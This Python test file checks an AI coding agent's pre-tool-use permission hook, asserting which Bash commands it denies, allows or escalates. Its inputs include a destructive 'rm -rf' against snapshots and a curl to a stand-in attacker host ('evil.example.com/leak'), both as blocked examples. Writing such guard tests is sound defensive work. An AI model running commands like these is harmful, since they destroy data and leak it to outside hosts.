import json
import subprocess
import sys
from pathlib import Path

HOOK = Path("app/initial_workspace_default/.claude/hooks/pre_tool_use.py")


def _run(payload: dict) -> tuple[int, dict]:
    proc = subprocess.run(
        [sys.executable, str(HOOK)],
        input=json.dumps(payload),
        capture_output=True, text=True, timeout=5,
    )
    return proc.returncode, json.loads(proc.stdout or "{}")


def test_refuses_rm_against_snapshots():
    rc, out = _run({
        "tool_name": "Bash",
        "tool_input": {"command": "rm -rf workspace/snapshots/q1"},
    })
    assert out.get("permissionDecision") == "deny"
    assert "snapshots" in out.get("permissionDecisionReason", "").lower()


def test_allows_normal_bash():
    rc, out = _run({"tool_name": "Bash", "tool_input": {"command": "ls"}})
    assert out.get("permissionDecision") in (None, "allow")


def test_refuses_curl_external_host():
    rc, out = _run({
        "tool_name": "Bash",
        "tool_input": {"command": "curl https://evil.example.com/leak"},
    })
    assert out.get("permissionDecision") == "deny"
    assert "network" in out.get("permissionDecisionReason", "").lower()


def test_allows_curl_to_anthropic():
    rc, out = _run({
        "tool_name": "Bash",
        "tool_input": {"command": "curl https://api.anthropic.com/v1/health"},
    })
    assert out.get("permissionDecision") in (None, "allow")


def test_prompts_for_admin_grant():
    rc, out = _run({
        "tool_name": "Bash",
        "tool_input": {"command": "agnes admin grant create --group Sales --table foo"},
    })
    assert out.get("permissionDecision") == "ask"
